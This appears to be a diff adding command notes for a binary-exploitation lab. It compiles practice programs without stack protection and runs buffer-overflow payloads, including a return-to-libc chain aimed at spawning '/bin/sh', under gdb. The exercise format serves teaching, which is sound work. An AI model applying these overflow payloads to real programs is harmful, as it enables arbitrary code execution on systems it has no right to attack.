@@ -1,0 +1,28 @@
+g++ -m32 -fno-stack-protector -g 01-calling-arguments.cpp -o 01-calling-arguments
+
+gdb -q ./01-calling-arguments -ex "set disassembly intel" -ex "set confirm off"
+
+r $(python -c 'print "a" * 128 + "c" * 12 + "\x90\x21\xe4\xf7" + "dddd" + "\x50\x85\x04\x08"')
+
+
+
+
+find 0xf7e42190, +99999999999999, "/bin/sh"
+
+./02-return-to-libc $(python -c 'print "a" * 128 + "c" * 12 + "\x90\x21\xe4\xf7" + "dddd" + "\x24\x2a\xf6\xf7"')
+
+
+
+g++ -fno-stack-protector -g 03-x86-64.cpp -o 03-x86-64
+
+gdb -q 03-x86-64 -ex "set disassembly intel"
+
+
+
+g++ -fno-stack-protector -g 04-gadgets.cpp -o 04-gadgets
+
+
+
+g++ -fno-stack-protector -g 05-memory-write.cpp -o 05-memory-write
+
+info proc mappings
